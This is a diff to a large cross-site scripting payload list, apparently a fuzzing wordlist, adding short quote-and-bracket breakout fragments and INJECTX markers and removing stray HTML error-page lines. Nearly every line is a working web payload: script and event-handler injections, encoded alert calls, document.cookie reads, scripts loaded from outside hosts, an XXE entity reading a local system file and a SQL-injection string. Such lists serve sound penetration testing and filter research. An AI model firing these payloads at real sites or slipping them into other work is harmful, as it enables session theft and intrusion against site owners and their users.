@@ -1,4 +1,5 @@
 !--" /><script>alert('xss');</script>
+"
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 " onfocus=alert(document.domain) "> <"
 "'>confirm&lpar;1)</Script><Svg><Script/1='
@@ -7,8 +8,12 @@
 "'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
 "'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
 "'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+")
+");
+")>
 "-eval("window['pro'%2B'mpt'](8)")-"
 "-prompt(8)-"
+"/>
 "/></a></><img src=1.gif onerror=alert(1)>
 "/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
 "/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
@@ -21,6 +26,7 @@
 "/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
 ";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
 ";a=prompt,a()//
+">
 ">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
 ">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
 "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
@@ -123,12 +129,12 @@
 "autof<x>ocus o<x>nfocus=alert<x>(1)//
 "autofocus onfocus=alert(1) //
 "autofocus/onfocus=alert(1)//
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 "o<x>nmouseover=alert<x>(1)//
 "onclick=prompt(8)>"@x.y
 "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 "onmouseover=alert(1) //
 "onmouseover=alert(1)//
+#
 # credit to rsnake
 #"><img src=M onerror=alert('XSS');>
 #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
@@ -439,8 +445,10 @@ ${alert(1)}
 &lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
 &quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
 &{document.vulnerable=true;};
+'
 ' onmouseover=alert(/XSS/)
 '""><script language="JavaScript"> alert('X \nS \nS');</script>
+'">
 '"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
 '"></title><script>alert(1111)</script>
 '"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
@@ -451,8 +459,10 @@ ${alert(1)}
 '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
 '';!--"<XSS>=&{()}
 '';!--\"&lt;XSS&gt;=&{()}
+')
 '); alert('XSS
 '); alert('xss'); var x='
+')>
 '-alert(1)-'
 '-alert(1)-'<svg>
 '-alert(1)//
@@ -461,6 +471,7 @@ ${alert(1)}
 '-eval("window['pro'%2B'mpt'](8)")-'
 '-prompt(8)-'
 '1<svg onload=alert(1)>
+';
 ';';;!--";<;XSS>;=&;{()}
 ';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
 ';a=prompt,a()//
@@ -473,6 +484,7 @@ ${alert(1)}
 ';onerror=alert;throw 1//
 '<'/'><'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'>
 '<script>window.onload=function(){document.forms[0].message.value='1';}</script>
+'>
 '>"><script src = 'http://www.site.com/XSS.js'></script>
 '>//\\,<'>">">"*"
 '></select><script>alert(123)</script>
@@ -503,7 +515,10 @@ ${alert(1)}
 --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
 -alert(1)//\
 -alert(1)}//\
+/'>
+/* INJECTX
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+// INJECTX
 //--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
@@ -520,6 +535,7 @@ ${alert(1)}
 1<svg onload=alert(1)>
 1script3document.vulnerable=true;1/script3
 : \');confirm(1);//
+;
 <! '="foo"><x foo='><img src=x onerror=alert(2)//'>
 <! foo="><script>alert(1)</script>">
 <! foo="><script>alert(91)</script>">
@@ -534,6 +550,7 @@ ${alert(1)}
 <!-- IE 5-9 standards mode -->
 <!-- IE 6-9 -->
 <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+<!-- INJECTX
 <!-- Up to Opera 11.64 - see link below -->
 <!-- Up to Opera 12.x -->
 <!-- injection --><svg height="50px">
@@ -555,7 +572,6 @@ ${alert(1)}
 <!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
 <!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>
 <!DOCTYPE doc [
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
 <![<!--]]<script>document.vulnerable=true;//--></script>
 <![><img src="]><img src=x onerror=alert(39)//">
 <![><img src="]><img src=x onerror=alert(XSS)//">
@@ -588,7 +604,6 @@ ${alert(1)}
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
 </form>
 </form>//["'`-->]]>]</div>
-</head>
 </html>
 </html>//["'`-->]]>]</div>
 </image>
@@ -756,7 +771,6 @@ ${alert(1)}
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
 <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
-<?xml version="1.0" encoding="utf-8"?>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
 <?xml-stylesheet type="text/xml" href="#stylesheet"?>
 <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
@@ -1862,7 +1876,6 @@ ${alert(1)}
 <body style="background:gray">
 <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
 <body/onload=&lt;!--&gt;&#10alert(1)>
-<body>
 <body><a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
 <body>Hello</body>
 <br SIZE="&{document.vulnerable=true}">
@@ -3424,9 +3437,7 @@ ${alert(1)}
 <h1 onpaste="alert(1)" contenteditable>test</h1>
 <h1/onclick=alert(1)>a//INJECTX
 <h1><font color=blue>hellox worldss</h1>
-<h1>Error 503 first byte timeout</h1>
 <h1>INJECTX</h1>
-<h3>Error 54113</h3>
 <handler id="y">alert(127)</handler>
 <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
 <head draggable="true" ondrag="alert(1)">test</head>
@@ -3461,7 +3472,6 @@ ${alert(1)}
 <head onmouseover="alert(1)">test</head>
 <head onmouseup="alert(1)">test</head>
 <head onpaste="alert(1)" contenteditable>test</head>
-<head>
 <head></head><body>padding<bleh onclick="top[/al/.source+/ert/.source]	``">clickpadding</bleh></body>
 <head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
 <head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
@@ -3562,7 +3572,6 @@ ${alert(1)}
 <hr onmouseover="alert(1)">test</hr>
 <hr onmouseup="alert(1)">test</hr>
 <hr onpaste="alert(1)" contenteditable>test</hr>
-<hr>
 <html draggable="true" ondrag="alert(1)">test</html>
 <html draggable="true" ondragend="alert(1)">test</html>
 <html draggable="true" ondragenter="alert(1)">test</html>
@@ -3610,7 +3619,6 @@ ${alert(1)}
 <html ontouchmove=alert(1)>
 <html ontouchstart=alert(1)>
 <html xmlns="http://www.w3.org/1999/xhtml">
-<html>
 <html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
 <html><noalert><noscript>(123)</noscript><script>(123)</script>
 <http://onxxx%3D1/
@@ -5050,10 +5058,6 @@ ${alert(1)}
 <p onpaste="alert(1)" contenteditable>test</p>
 <p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
 <p/onclick=alert(/INJECTX/)>a
-<p>Details: cache-iad-kcgs7200117-IAD 1694220846 3034289987</p>
-<p>Details: cache-iad-kcgs7200152-IAD 1694220861 3200117174</p>
-<p>Varnish cache server</p>
-<p>first byte timeout</p>
 <param draggable="true" ondrag="alert(1)">test</param>
 <param draggable="true" ondragend="alert(1)">test</param>
 <param draggable="true" ondragenter="alert(1)">test</param>
@@ -7774,7 +7778,6 @@ ${alert(1)}
 <title onmouseup="alert(1)">test</title>
 <title onpaste="alert(1)" contenteditable>test</title>
 <title onpropertychange=javascript:alert(1)></title><title title=>
-<title>503 first byte timeout</title>
 <tr draggable="true" ondrag="alert(1)">test</tr>
 <tr draggable="true" ondragend="alert(1)">test</tr>
 <tr draggable="true" ondragenter="alert(1)">test</tr>
@@ -8230,10 +8233,15 @@ XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
 []['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
 [color=red width=expression(alert(123))][color]
 [color=red' onmouseover="alert('xss')"]mouse over[/color]
+\"
+\");
+\"+
+\";
 \";;alert(';XSS';);//
 \";alert('XSS');//
 \";document.vulnerable=true;;//
 \&quot;;alert(&apos;XSS&apos;);//
+\'
 \'-alert(1)//
 \'-alert(1)//<svg>
 \'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
